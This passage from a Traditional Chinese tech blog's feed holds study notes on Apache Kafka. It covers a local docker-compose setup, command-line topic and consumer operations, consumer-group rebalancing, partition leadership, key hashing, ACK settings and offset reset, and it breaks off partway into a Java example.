                &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#kafka&quot;&gt;#kafka&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;環境設定&quot; tabindex=&quot;-1&quot;&gt;環境設定&lt;/h2&gt;
&lt;p&gt;docker-compose.yaml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;version: &#39;2.1&#39;
services:
  zoo1:
    image: confluentinc/cp-zookeeper:7.3.2
    hostname: zoo1
    container_name: zoo1
    ports:
      - &amp;quot;2181:2181&amp;quot;
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_SERVER_ID: 1
      ZOOKEEPER_SERVERS: zoo1:2888:3888

  kafka1:
    image: confluentinc/cp-kafka:7.3.2
    hostname: kafka1
    container_name: kafka1
    ports:
      - &amp;quot;9092:9092&amp;quot;
      - &amp;quot;29092:29092&amp;quot;
      - &amp;quot;9999:9999&amp;quot;
    environment:
      KAFKA_ADVERTISED_LISTENERS: INTERNAL://kafka1:19092,EXTERNAL://${DOCKER_HOST_IP:-127.0.0.1}:9092,DOCKER://host.docker.internal:29092
      KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT,DOCKER:PLAINTEXT
      KAFKA_INTER_BROKER_LISTENER_NAME: INTERNAL
      KAFKA_ZOOKEEPER_CONNECT: &amp;quot;zoo1:2181&amp;quot;
      KAFKA_BROKER_ID: 1
      KAFKA_LOG4J_LOGGERS: &amp;quot;kafka.controller=INFO,kafka.producer.async.DefaultEventHandler=INFO,state.change.logger=INFO&amp;quot;
      KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 1
      KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 1
      KAFKA_JMX_PORT: 9999
      KAFKA_JMX_HOSTNAME: ${DOCKER_HOST_IP:-127.0.0.1}
      KAFKA_AUTHORIZER_CLASS_NAME: kafka.security.authorizer.AclAuthorizer
      KAFKA_ALLOW_EVERYONE_IF_NO_ACL_FOUND: &amp;quot;true&amp;quot;
    depends_on:
      - zoo1
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker compose up  -d
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;docker exec -it kafka1 bash
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;刪除 JMX env&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unset JMX_PORT &amp;amp;&amp;amp; unset KAFKA_JMX_OPTS
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --create --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;檢查 topic 詳情&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-topics --describe --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建一個 producer&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;查看目前 topic 有多少 message, 顯示的是 offset 的值&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic quickstart-events
quickstart-events:0:16

$ kafka-run-class kafka.tools.GetOffsetShell --broker-list localhost:9092 --topic filebeat
filebeat:0:0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;建立一個 訂閱者，訂閱 quickstart-events&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-consumer --topic quickstart-events --from-beginning --bootstrap-server localhost:9092
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;測試 kafka consumer group  消費機制&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;kafka-console-producer --topic quickstart-events --bootstrap-server localhost:9092 --group 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;同一個 group 只會有一個 consumer 會消費到一個 topic 的訊息&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;顯示目前 kafka 有多少 topic&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[appuser@kafka1 ~]$ kafka-topics --list --bootstrap-server localhost:9092
__consumer_offsets
filebeat
metricbeat
my_group2_v2
quickstart-events
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/" >
        </entry>
        <entry>
            <title>
                Kafka 冪等 Producer
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/</id>
            <content type="html">
                &lt;h1 id=&quot;冪等定義&quot; tabindex=&quot;-1&quot;&gt;冪等定義&lt;/h1&gt;
&lt;p&gt;冪等 = 同一個操作，執行一次或執行多次，結果都一樣。&lt;br /&gt;
不論你做 1 次、10 次、100 次，&lt;br /&gt;
系統的最終狀態必須一模一樣。&lt;/p&gt;
&lt;p&gt;kafka 重複 message 問題&lt;br /&gt;
若 ack 消息回傳期間網路中斷&lt;br /&gt;
Producer 就不會收到 ACK 通知，就會觸發 Retry 機制&lt;br /&gt;
造成訊息重複發送的情況&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251208002229.png&quot; alt=&quot;Pasted image 20251208002229.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/" >
        </entry>
        <entry>
            <title>
                Kafka rebalance 機制 - Eager Rebalance
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/</id>
            <content type="html">
                &lt;h1 id=&quot;eager-rebalance-rebalance&quot; tabindex=&quot;-1&quot;&gt;Eager Rebalance(此 rebalance 會造成世界停止)&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;停止 consumer 訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194626.png&quot; alt=&quot;Pasted image 20251129194626.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;分配完重新開始訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194713.png&quot; alt=&quot;Pasted image 20251129194713.png&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;consumer 在 rebalance 後，不一定能再次訂閱到之前的 Partition&lt;/li&gt;
&lt;li&gt;在世界停止期間，所有 consumer 訂閱會停止&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制詳解&lt;/h2&gt;
&lt;hr /&gt;
&lt;p&gt;初始狀態&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129152948.png&quot; alt=&quot;Pasted image 20251129152948.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;新的 consumer 加入&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153059.png&quot; alt=&quot;Pasted image 20251129153059.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;通知 kafka cluster 的 Coordinator broker 進行 Rebalancing&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153922.png&quot; alt=&quot;Pasted image 20251129153922.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Coordinator broker 通知 consumer 斷開已連線的 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191802.png&quot; alt=&quot;Pasted image 20251129191802.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;開始 Rebalancing&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191900.png&quot; alt=&quot;Pasted image 20251129191900.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Coordinator broker 隨機選出一個 consumer 做為 Leader Consumer&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192518.png&quot; alt=&quot;Pasted image 20251129192518.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Leader Consumer 從 Coordinator broker 取得 consumer group info&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192715.png&quot; alt=&quot;Pasted image 20251129192715.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Leader Consumer&lt;/strong&gt; 的責任是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收集所有消費者的訂閱資訊 (subscription)。&lt;/li&gt;
&lt;li&gt;根據分配策略 (Range, RoundRobin, Sticky 等) 計算 &lt;strong&gt;partition → consumer 的映射&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;將分配結果提交給 Coordinator。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Coordinator&lt;/strong&gt; 再把這個分配結果下發給所有消費者，完成 rebalance。&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193028.png&quot; alt=&quot;Pasted image 20251129193028.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;完成 rebalance&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193100.png&quot; alt=&quot;Pasted image 20251129193100.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/" >
        </entry>
        <entry>
            <title>
                Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/</id>
            <content type="html">
                &lt;h1 id=&quot;背景故事&quot; tabindex=&quot;-1&quot;&gt;背景故事&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;kafka 在新版本引入Cooperative Rebalance(增量 Rebalance)機制&lt;br /&gt;
在過去版本中，只要 consumer 斷線，就會觸發 rebalance，會停止所有 consumer 的訂閱流&lt;br /&gt;
Cooperative Rebalance 就是為了解決這個問題&lt;br /&gt;
以下是具體流程&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;停止 consumer 1 對 Partition 2 的訂閱&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200033.png&quot; alt=&quot;Pasted image 20251129200033.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;過一段時間， kafka 會重新 Assign Partition 2 給 Consumer 2(new consumer)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200130.png&quot; alt=&quot;Pasted image 20251129200130.png&quot; /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!IMPORTANT]  Cooperative Rebalance 好處&lt;br /&gt;
其他 Consumer 還是可以持續訂閱，不會中斷&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;how-to-use&quot; tabindex=&quot;-1&quot;&gt;How to use?&lt;/h2&gt;
&lt;p&gt;kafka consumer 可以設定 partition.assignment.strategy&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/" >
        </entry>
        <entry>
            <title>
                Kafka leader partition 機制研究
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/</id>
            <content type="html">
                &lt;h1 id=&quot;leader-partition&quot; tabindex=&quot;-1&quot;&gt;leader partition 概念&lt;/h1&gt;
&lt;p&gt;每個 Topic 可以有多個 Partition&lt;br /&gt;
每個 Partition 都是一個 Partition 副本組&lt;br /&gt;
每個 Partition 副本組可以有多個 replication&lt;br /&gt;
每個 Partition 副本組會決定誰是 leader partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175715.png&quot; alt=&quot;Pasted image 20251207175715.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;topic = 多個 partition 副本組的集合&lt;br /&gt;
每個 Partition 都會有一個 Leader 與零個或多個 followers(副本)&lt;br /&gt;
kafka 分片分配規則&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在同個 topic 中，每個 partition 副本組的 leader 分片會儘量分散到每個 Broker&lt;/li&gt;
&lt;li&gt;一台 broker 可以同時擔任多個 partitions 副本組的 leader&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175340.png&quot; alt=&quot;Pasted image 20251207175340.png&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/" >
        </entry>
        <entry>
            <title>
                Kafka key hashing
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/</id>
            <content type="html">
                &lt;p&gt;Producer 預設的 Partition  邏輯使用 murmur2 進行邏輯分區，需要輸入 key，再根據 key 去切分此筆 message 該去哪個 partition，這帶來一個好處，只要是相同的 key，那他的分區位置就是可預測的，並且 kafka 保證分區內的 message 是有序性的，這點用於序列化資料是很重要的。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!CAUTION]&lt;br /&gt;
若使用 kafka key 有序性分區，當新增 partition 時，會打破原本的分區規則&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;若因業務需求無法擴張 partition 數量，例如交易資料需要有序性，可以增加 broker 數量&lt;br /&gt;
此論點依據為&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Leader partition 會重新分散到更多 broker&lt;br /&gt;
假設：&lt;br /&gt;
- 3 partitions&lt;br /&gt;
- 3 brokers
&lt;ul&gt;
&lt;li&gt;每個 broker 當 1 個 leader&lt;br /&gt;
現在變成：
&lt;ul&gt;
&lt;li&gt;3 partitions&lt;/li&gt;
&lt;li&gt;6 brokers&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leader 還是 3 個沒錯，但 follower replicas 會被分散&lt;/li&gt;
&lt;/ul&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/" >
        </entry>
        <entry>
            <title>
                Kafka consumer group 與 rebalance 機制
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/</id>
            <content type="html">
                &lt;p&gt;Topic 可以切分多個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134453.png&quot; alt=&quot;Pasted image 20251129134453.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一個 consumer 可以訂閱多個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134625.png&quot; alt=&quot;Pasted image 20251129134625.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;每個 consumer 都可以訂閱 Topic 內所有的 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135104.png&quot; alt=&quot;Pasted image 20251129135104.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;多個 Consumer 可以組成一個 Consumer group&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134529.png&quot; alt=&quot;Pasted image 20251129134529.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;同個 Consumer group 內共享 Topic 內所有的 Partition&lt;br /&gt;
一個 consumer 就會訂閱所有的 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135735.png&quot; alt=&quot;Pasted image 20251129135735.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;兩個 consumer 分散訂閱 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135906.png&quot; alt=&quot;Pasted image 20251129135906.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;三個 consumer 就會一個 consumer 訂閱一個 partition，均分所有的 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140037.png&quot; alt=&quot;Pasted image 20251129140037.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;若 consumer 數量 &amp;gt; Partition 數量，多餘的 Consumer 就會 Disable&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140258.png&quot; alt=&quot;Pasted image 20251129140258.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;ui&quot; tabindex=&quot;-1&quot;&gt;以 UI 介面為例&lt;/h2&gt;
&lt;p&gt;Consumer group: &lt;code&gt;my-java-application&lt;/code&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140444.png&quot; alt=&quot;Pasted image 20251129140444.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;訂閱了一個 Topic，並且擁有兩個 Member&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140641.png&quot; alt=&quot;Pasted image 20251129140641.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;並且從 Assigned partitions 可以得知，總共有三個 Partition&lt;br /&gt;
client id 為 &lt;code&gt;b52ac033-cf4b-49d2-8a13-78ea6b4e1cf1&lt;/code&gt; 的 consumer 分到 1 個 partition&lt;br /&gt;
client id 為 &lt;code&gt;5545bc61-e3fd-4f2f-a0d7-fc7d77d1ddcc&lt;/code&gt; 的 consumer 分到 2 個 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140811.png&quot; alt=&quot;Pasted image 20251129140811.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;查詢 consumer group 裡面的 member 目前訂閱哪個 Topic，與每個 member 訂閱的 Partition 有哪些&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups --bootstrap-server localhost:19092 --group my-java-application --describe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141307.png&quot; alt=&quot;Pasted image 20251129141307.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;案例實作&quot; tabindex=&quot;-1&quot;&gt;案例實作&lt;/h2&gt;
&lt;p&gt;Topic: demo_java&lt;br /&gt;
Partition: 3&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-topics.sh --bootstrap-server localhost:19092 --topic demo_java --describe                           
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141715.png&quot; alt=&quot;Pasted image 20251129141715.png&quot; /&gt;&lt;/p&gt;
&lt;h3 id=&quot;case-1&quot; tabindex=&quot;-1&quot;&gt;Case 1: 只有一個訂閱者&lt;/h3&gt;
&lt;p&gt;CONSUMER-ID: consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 (訂閱三個 partition)&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141509.png&quot; alt=&quot;Pasted image 20251129141509.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-2&quot; tabindex=&quot;-1&quot;&gt;Case 2: 兩個訂閱者&lt;/h2&gt;
&lt;p&gt;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75 訂閱 id: 0,1 partition&lt;br /&gt;
consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 訂閱 id: 2 partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141835.png&quot; alt=&quot;Pasted image 20251129141835.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-3-partition-consumer&quot; tabindex=&quot;-1&quot;&gt;Case 3: 三個訂閱者(一個 Partition 對應一個 consumer)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142121.png&quot; alt=&quot;Pasted image 20251129142121.png&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;case-4-and-gt-partition&quot; tabindex=&quot;-1&quot;&gt;Case 4: 四個訂閱者(訂閱者數量 &amp;gt; Partition 數量)&lt;/h2&gt;
&lt;p&gt;Consumer 0 未被分配到任一個 Partition&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142635.png&quot; alt=&quot;Pasted image 20251129142635.png&quot; /&gt;&lt;/p&gt;
&lt;h1 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制&lt;/h1&gt;
&lt;p&gt;每次 Rebalance 都需要 Broker 參與，但不是每台 Broker 都需要參與 Rebalance 的行為，只有 Coordinator Broker 才需要&lt;br /&gt;
透過以下指令查詢 Coordinator Broker&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups.sh --bootstrap-server localhost:19092 --group my-java-application --describe --state 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129144503.png&quot; alt=&quot;Pasted image 20251129144503.png&quot; /&gt;&lt;br /&gt;
以這次案例來說，group: my-java-application 的 Coordinator Broker 是 localhost:19092&lt;/p&gt;
&lt;p&gt;觀察每次新建 consumer 都會產出的 Log&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Request joining group due to: group is already rebalancing
Revoke previously assigned partitions demo_java-1

(Re-)joining group

Successfully joined group with generation Generation{generationId=34, memberId=&#39;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75&#39;, protocol=&#39;range&#39;}

Notifying assignor about the new Assignment(partitions=[demo_java-2])
Adding newly assigned partitions: demo_java-2
Setting offset for partition demo_java-2 to the committed offset FetchPosition{offset=959, offsetEpoch=Optional[1], currentLeader=LeaderAndEpoch{leader=Optional[localhost:19092 (id: 0 rack: null)], epoch=absent}}
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Log&lt;/th&gt;
&lt;th&gt;解釋&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Request joining group due to: group is already rebalancing&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Group 在 rebalance，consumer 需要重新加入 group。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Revoke previously assigned partitions demo_java-1&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;Coordinator 通知 consumer 放棄目前持有的 partition，準備進入下一輪分配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;(Re-)joining group&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 正在重新加入 group，等待 coordinator 分配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Successfully joined group with generation...&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 正式加入 group，獲得 generationId 與 memberId。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Notifying assignor about the new Assignment(...)&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer client 收到 coordinator 的分配結果，更新要訂閱的 partition&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Adding newly assigned partitions: demo_java-2&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;新一輪 rebalance 分配到了 demo_java-2。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Setting offset for partition demo_java-2 to the committed offset...&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;consumer 讀取起點設定為 partition 目前已 commit 的 offset（本例為 959）。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP]&lt;br /&gt;
Generation 用於追蹤目前 Group 的狀態，避免舊的成員提交 offset，只有新成員能提交 Partition offset&lt;/p&gt;
&lt;/blockquote&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/" >
        </entry>
        <entry>
            <title>
                Kafka Topic Availability
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/</id>
            <content type="html">
                &lt;h1 id=&quot;producer-ack&quot; tabindex=&quot;-1&quot;&gt;Producer ACK 機制說明&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;ACK = 0
&lt;ul&gt;
&lt;li&gt;Case: 發送速度最快，但資料丟失風險最大&lt;/li&gt;
&lt;li&gt;只要發送成功就繼續發送下一筆&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACK = 1
&lt;ul&gt;
&lt;li&gt;Case: 剛剛好的發送速度，適合日常一般資料使用，有部分資料丟失風險&lt;/li&gt;
&lt;li&gt;Leader Partition 回傳 ACK 就算成功&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ACK = all (搭配)
&lt;ul&gt;
&lt;li&gt;Case: 希望資料不要丟失，可以考慮這個設置&lt;/li&gt;
&lt;li&gt;需要 Partition 副本組內指定 min.insync.replicas 數量的 replica ACK，訊息才會 ACK
&lt;ul&gt;
&lt;li&gt;min.insync.replicas = 1 -&amp;gt; Leader ACK 就成功&lt;/li&gt;
&lt;li&gt;min.insync.replicas = 2 -&amp;gt; Leader + replica 兩個 ACK 就成功&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207231419.png&quot; alt=&quot;Pasted image 20251207231419.png&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/" >
        </entry>
        <entry>
            <title>
                Consumer offset reset 行為
                
            </title>
            <updated>2025-12-18T06:26:31Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/</id>
            <content type="html">
                &lt;h1 id=&quot;情境&quot; tabindex=&quot;-1&quot;&gt;情境&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;consumer 預期會從 kafka 持續讀取 log，但如果 consumer crash，kafka 會保存 commited offset 7 天&lt;/p&gt;
&lt;p&gt;也說明，若 consumer 停機超過 7 天，之前消費的位置將會被重置&lt;/p&gt;
&lt;h1 id=&quot;參數&quot; tabindex=&quot;-1&quot;&gt;參數&lt;/h1&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;auto.offset.reset=latest: 會從 kafka topic 最末端讀取 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=earliest: 從最早的地方開始讀 log&lt;/li&gt;
&lt;li&gt;auto.offset.reset=none: 若沒有 offset 資訊，將會拋出 exception&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;log-consumer&quot; tabindex=&quot;-1&quot;&gt;重播 log 給 consumer&lt;/h1&gt;
&lt;hr /&gt;
&lt;p&gt;步驟如下:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;關閉該 consumer group 底下所有的 consumer&lt;/li&gt;
&lt;li&gt;使用 kafka-consumer-groups 重置你想重置的 offset 位置&lt;/li&gt;
&lt;li&gt;重啟 consumer&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;java-code&quot; tabindex=&quot;-1&quot;&gt;Java code&lt;/h1&gt;
&lt;p&gt;透過 addShutdownHook 偵測 shutdown event&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;...
// get a reference  
